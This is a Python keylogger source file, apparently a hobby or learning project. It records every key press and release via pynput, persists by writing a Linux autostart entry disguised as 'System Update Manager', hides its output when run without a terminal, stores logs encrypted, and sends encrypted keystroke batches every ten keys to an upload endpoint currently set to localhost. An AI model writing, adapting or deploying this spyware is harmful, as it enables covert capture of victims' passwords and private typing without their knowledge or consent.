from pynput import keyboard 
import os 
import datetime 
from cryptography.fernet import Fernet
import sys
import time 
import requests 
import getpass

EXFIL_THRESHOLD = 10  # Sending after every 10 keystrokes
buffer = []

def setup_autostart():
    autostart_dir = os.path.expanduser("~/.config/autostart")
    os.makedirs(autostart_dir, exist_ok=True)

    script_path = os.path.abspath(__file__)
    desktop_path = os.path.join(autostart_dir, "systemupdate.desktop")

    # Only create the desktop file if it doesn't already exist
    if not os.path.exists(desktop_path):
        desktop_entry = f"""[Desktop Entry]
Type=Application
Exec=python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=System Update Manager
Comment=Startup Keylogger
"""
        with open(desktop_path, "w") as f:
            f.write(desktop_entry)

setup_autostart()

if not os.path.exists("key.key"):
    key = Fernet.generate_key()
    with open ("key.key", "wb") as f:
        f.write(key)
else:
    with open ("key.key", "rb") as kf:
        key=kf.read()

fernet= Fernet(key)
#fuck mera code mujhe hi smj ni aara =check point 
logfile="keylog.txt"

def exfiltrate():
    if buffer:
        joined = "\n".join(buffer)
        encrypted = fernet.encrypt(joined.encode())
        try:
            requests.post("http://127.0.0.1:5000/upload", data=encrypted)
        except Exception as e:
            pass  # Simulate failure silently
        buffer.clear()

if not sys.stdout.isatty():
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')


def log_key(key):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    full_log= f"[{timestamp}] {key}"
    encrypt=fernet.encrypt(full_log.encode())
    with open(logfile , "a") as f:
        f.write( encrypt.decode() +"\n ")
    
    buffer.append(full_log)
    if len(buffer) >= EXFIL_THRESHOLD:
        exfiltrate()

def on_press(key):
    try:
        log_key("key {0} pressed " .format(key.char))
    except AttributeError:
        log_key('special key {0} pressed ' .format(key))

def on_release(key):
    log_key('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop the  listener
        return False

# Collect of events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

